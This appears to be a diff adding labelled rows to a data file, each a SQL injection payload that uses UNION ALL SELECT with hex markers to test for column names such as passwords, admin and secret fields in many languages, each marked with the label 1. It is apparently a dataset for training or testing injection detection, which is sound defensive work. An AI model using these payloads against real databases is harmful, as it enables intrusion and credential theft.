+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT login_pas FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PVkD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginpassword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vmtb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginpasswd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Seao",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginpass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CfUX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginpas FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hPKj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT loginpwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nZSG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT secret FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nwAo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT secret_code FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NPwH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT secretcode FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YrWW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT administrators FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MCub",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminpass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zoby",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminpassword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zlkv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminpaw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Svcs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminpwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cPhp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminuid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZYrF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT upass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LXJP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `level` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VgnA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mima FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AMTI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sb_admin_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TydL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sb_pwd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cOsR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT client FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YtjL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT clients FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dRrF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ipaddress FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MKvT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT files FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ebAC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT family FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pYax",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT admin_psw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Vipj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT administrateur FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kOTw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminpsw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rmZo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adminupass FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oGqM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT adress FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Owwd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aide FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AaOZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT articleid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HyDT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT content FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YhOR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yzRy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT feed FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OoXQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT feedback FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JLmn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT glmm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qVBH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT isadmin FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qrUW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `key` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Hodu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT keywords FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JCVQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mpassword FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EEhu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT msn FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LiHl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT musername FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WhdE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT newsid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- saXp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT numer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jjvu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT passer FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bsmI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pe_aduser FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SuIs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pe_user FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BWcn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT power FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oASf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pswd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cekq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pwd1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GoiW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qq FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sdUd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT stocker FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hrJn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sysuser FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yCRL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT telephone FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rmoi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT texte FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yShC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT userpasswd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FVMa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usr_nusr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CBNw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT usr_pw FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZEVO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT website FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EGTg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT wind FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MsdL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT compte FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VKfo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT comptes FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tSbs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT objectif FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hOmo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT authentifier FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mBBJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT authentification FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PLLY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT fissure FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BGVQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `adressee-mail` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Vhsn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT complet FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GgLp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT groupe FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TzAf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT hachage FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vfXA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT connexion FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AfFA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT membres FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zdGh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CsAs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT p FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- puKk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT u FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cKRu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mot_de_passe_bdd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kpMs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mon_mot_de_passe FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VPun",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT monmotdepasse FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cLTJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ignatiusj FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CdpD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `caroline-du-nord` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OvbX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nouveau FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ttcv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sel FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dhkO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT recherche FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hQxz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT utilisateurs FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QSvb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT o FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XdCc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT konto FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jAPN",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rachunki FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jZVk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT administratorzy FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mysZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pomoc FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hmme",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cel FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZcAC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT uwierzytelnienia FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FQwk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT uwierzytelnianie FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AZQc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kontakt FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zera",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT klient FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Isgb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT danych FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Yiri",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `adres_e-mailowy` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IHeK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT grupy FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZehS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT obrazy FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mOKz",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT spis FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Sonp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dostawcy FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KyYl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nazwisko FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zvov",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT zaloguj FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hEGc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT nowy FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yeUK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT telefon FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DppG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT seryjny FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gNSQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ustawienie FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ErMQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kod FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fvyD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT stan FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kRjB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sklep1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MyCH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sklep2 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KAQP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tekst FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eVaa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT zytk FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SqTf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT konta FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mtDK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rysa FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XCbI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `adrese-mail` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rsHk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ecolo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Lutk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tat FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NawK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT yh FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JBHn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT yhm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AErA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT yhmm FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ltkp",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT yonghu FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dDof",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT content_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KZSv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT codigo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jZXI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT geometry FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HpLo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT published FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FrQU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT section_value FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BzeK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tidcliente FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kvyO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT menuid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- stDk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pollid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TUnI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jRVT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT moduleid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xkJJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gab_pergunta FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QzpS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tipo FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NNPi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT template FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wIGH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT multilinestring FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xwvR",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aal_aluno FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tsbl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ava_professor FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- igFC",1
